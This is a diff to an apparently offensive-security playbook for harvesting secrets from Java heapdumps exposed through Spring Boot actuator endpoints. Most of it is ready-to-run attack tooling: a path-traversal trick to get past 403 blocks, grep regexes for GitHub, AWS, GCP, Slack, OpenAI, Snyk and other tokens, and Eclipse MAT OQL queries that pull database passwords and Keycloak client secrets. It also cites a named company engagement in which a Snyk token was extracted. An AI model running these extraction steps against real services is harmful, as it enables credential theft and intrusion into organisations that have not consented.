@@ -18,6 +18,50 @@ ls -lh heapdump.hprof
 - 403 → blocked (try path traversal: `/context/..;/actuator/heapdump`)
 - 404 → endpoint disabled
 
+## Quick Wins Before MAT (5-minute triage)
+
+Run these IMMEDIATELY after downloading a heapdump, before investing time in Eclipse MAT setup:
+
+```bash
+HEAP="heapdump.hprof"
+
+# 1. Known token format patterns (highest ROI — exact regex, low false positives)
+echo "=== Known Token Formats ==="
+strings -n 10 "$HEAP" | grep -oE "ghp_[a-zA-Z0-9]{36}"                    # GitHub PAT
+strings -n 10 "$HEAP" | grep -oE "ghs_[a-zA-Z0-9]{36}"                    # GitHub App
+strings -n 10 "$HEAP" | grep -oE "glpat-[a-zA-Z0-9_-]{20}"               # GitLab PAT
+strings -n 10 "$HEAP" | grep -oE "AKIA[A-Z0-9]{16}"                       # AWS Access Key
+strings -n 10 "$HEAP" | grep -oE "ya29\.[a-zA-Z0-9_-]{50,}"              # GCP OAuth
+strings -n 10 "$HEAP" | grep -oE "AIza[0-9A-Za-z_-]{35}"                  # Google API key
+strings -n 10 "$HEAP" | grep -oE "xox[baprs]-[a-zA-Z0-9-]+"              # Slack
+strings -n 10 "$HEAP" | grep -oE "sk-[a-zA-Z0-9]{20,}"                    # OpenAI/Stripe
+strings -n 10 "$HEAP" | grep -oE "snyk-[a-zA-Z0-9-]{36}"                  # Snyk (alt)
+strings -n 10 "$HEAP" | grep -oE "dt0c01\.[A-Z0-9]{24}\.[A-Z0-9]{64}"    # Dynatrace API
+
+# 2. UUIDs (Snyk tokens, client secrets, API keys are often UUID format)
+echo "=== UUIDs (potential tokens) ==="
+strings -n 36 "$HEAP" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" | sort -u | head -50
+
+# 3. JWTs (service account tokens, refresh tokens)
+echo "=== JWTs ==="
+strings -n 50 "$HEAP" | grep -oE "eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}" | head -20
+
+# 4. Connection strings (immediate credential extraction)
+echo "=== Connection Strings ==="
+strings -n 10 "$HEAP" | grep -iE "(jdbc:|redis://|amqp://|mongodb://|postgres://|mysql://)" | sort -u
+
+# 5. Config class names (tells you what to query in MAT)
+echo "=== Config Classes (for MAT targeting) ==="
+strings -n 10 "$HEAP" | grep -oE "[a-z]+\.[a-z]+\.[a-z]+\.(Secret|Token|Credential|Config|Properties)[A-Za-z]*" | sort -u
+```
+
+**Decision after triage:**
+- Found tokens/JWTs → validate immediately, continue with MAT for more
+- Found config class names but no values → MAT is required (values are in object fields)
+- Found nothing → heapdump may be from a minimal service; still use MAT (char[] search)
+
+**Key lesson (BFI Finance):** `strings | grep` found config property NAMES (`ServiceSecretKeyConfigProperties.SecretKeyElement(name=, key=, ownerKey=`) but NOT the actual secret values. A team member using Eclipse MAT with targeted OQL on that exact class extracted the Snyk token. Always follow up with MAT.
+
 ## Extraction Methods (ordered by effectiveness)
 
 ### Method 1: Eclipse MAT (Best for object graph traversal)
@@ -25,13 +69,43 @@ ls -lh heapdump.hprof
 ```bash
 # Install
 brew install --cask eclipse-memory-analyzer
-
-# Open heapdump, then:
-# 1. OQL query for Spring Environment:
-#    SELECT * FROM org.springframework.core.env.MapPropertySource
-# 2. Look for "systemProperties" and "systemEnvironment" sources
-# 3. Expand to find resolved config values
 ```
+
+**OQL Recipes (run in MAT's OQL console):**
+
+```sql
+-- Find all Spring Environment property values (most reliable for secrets)
+SELECT * FROM org.springframework.core.env.MapPropertySource
+
+-- Find String values inside any *Secret* or *Token* config class
+SELECT toString(obj) FROM java.lang.String obj
+WHERE inbound(obj).@className LIKE ".*[Ss]ecret.*|.*[Tt]oken.*|.*[Cc]redential.*"
+
+-- Find all char[] that look like UUIDs (Snyk tokens, API keys)
+SELECT toString(c) FROM char[] c WHERE c.@length == 36
+
+-- Find all char[] that look like JWTs
+SELECT toString(c) FROM char[] c WHERE c.@length > 100 AND toString(c) LIKE "eyJ%"
+
+-- Target a specific config class (adapt per engagement)
+-- Example: BFI's ServiceSecretKeyConfigProperties
+SELECT obj.name.toString(), obj.key.toString(), obj.ownerKey.toString()
+FROM com.example.config.ServiceSecretKeyConfigProperties$SecretKeyElement obj
+
+-- Find HikariCP datasource URLs and passwords
+SELECT toString(ds.jdbcUrl), toString(ds.username), toString(ds.password)
+FROM com.zaxxer.hikari.HikariDataSource ds
+
+-- Find Keycloak adapter config (client secrets)
+SELECT toString(c.resource), toString(c.credentials)
+FROM org.keycloak.representations.adapters.config.AdapterConfig c
+```
+
+**Workflow:**
+1. Open `.hprof` in MAT → wait for index build (can take minutes for large heaps)
+2. Run OQL queries above targeting config classes
+3. Follow object references: class → field → String → value char[]
+4. Export findings to text file
 
 ### Method 2: jhat (JDK built-in, good for quick analysis)
 
@@ -41,7 +115,9 @@ jhat heapdump.hprof
 # Navigate to: All Classes → search for "Environment" or "DataSource"
 ```
 
-### Method 3: strings + grep (Fast but incomplete)
+### Method 3: strings + grep (Fast but incomplete — use as TRIAGE only)
+
+**WARNING:** This method finds ~20% of secrets at best. It CANNOT follow Java object references. Always follow up with MAT or heapdump_tool for thorough extraction. The primary value of `strings` is quick triage to confirm the heapdump contains interesting classes/config, then switch to MAT for actual value extraction.
 
 ```bash
 # Basic extraction (misses values in object fields)
@@ -50,10 +126,27 @@ strings -n 10 heapdump.hprof | grep -iE "(password|secret|token|jdbc:|redis:|amq
 # Search for specific patterns
 strings -n 10 heapdump.hprof | grep -oE "eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}"  # JWT
 strings -n 10 heapdump.hprof | grep -oE "https?://[a-zA-Z0-9._:-]+/realms/[a-zA-Z0-9_-]+"  # Keycloak URLs
-strings -n 10 heapdump.hprof | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"  # UUIDs
+strings -n 10 heapdump.hprof | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"  # UUIDs (Snyk tokens, API keys)
+
+# Known token format patterns (run ALL of these)
+strings -n 10 heapdump.hprof | grep -oE "ghp_[a-zA-Z0-9]{36}"          # GitHub PAT
+strings -n 10 heapdump.hprof | grep -oE "ghs_[a-zA-Z0-9]{36}"          # GitHub App token
+strings -n 10 heapdump.hprof | grep -oE "glpat-[a-zA-Z0-9_-]{20}"      # GitLab PAT
+strings -n 10 heapdump.hprof | grep -oE "AKIA[A-Z0-9]{16}"             # AWS Access Key
+strings -n 10 heapdump.hprof | grep -oE "ya29\.[a-zA-Z0-9_-]{50,}"     # GCP OAuth token
+strings -n 10 heapdump.hprof | grep -oE "AIza[0-9A-Za-z_-]{35}"        # Google API key
+strings -n 10 heapdump.hprof | grep -oE "xox[baprs]-[a-zA-Z0-9-]+"     # Slack token
+strings -n 10 heapdump.hprof | grep -oE "sk-[a-zA-Z0-9]{20,}"          # OpenAI/Stripe key
+strings -n 10 heapdump.hprof | grep -oE "snyk-[a-zA-Z0-9-]{36}"        # Snyk token (alt format)
+strings -n 10 heapdump.hprof | grep -oE "dt0c01\.[A-Z0-9]{24}\.[A-Z0-9]{64}"  # Dynatrace API token
+
+# toString() representations (reveals config structure even without values)
+strings -n 10 heapdump.hprof | grep -E "\.(Secret|Token|Credential|Config).*\(" | sort -u
 ```
 
 **IMPORTANT:** `strings` alone is INSUFFICIENT for Java heapdumps. Resolved Spring config values are stored in Java object fields (char arrays inside String objects inside PropertySource maps). They won't appear as contiguous ASCII strings. Use Eclipse MAT or the Python method below for thorough extraction.
+
+**Lesson learned (BFI Finance, May 2026):** Team member found a Snyk token (UUID format) using Eclipse MAT by querying the `ServiceSecretKeyConfigProperties` class directly. The same heapdump analyzed with `strings | grep` found the config property NAMES (`ServiceSecretKeyConfigProperties.SecretKeyElement(name=, key=, ownerKey=`) but NOT the actual values — because the values are stored as separate `char[]` objects linked by object references that only MAT can follow.
 
 ### Method 4: Python binary search (middle ground)
 
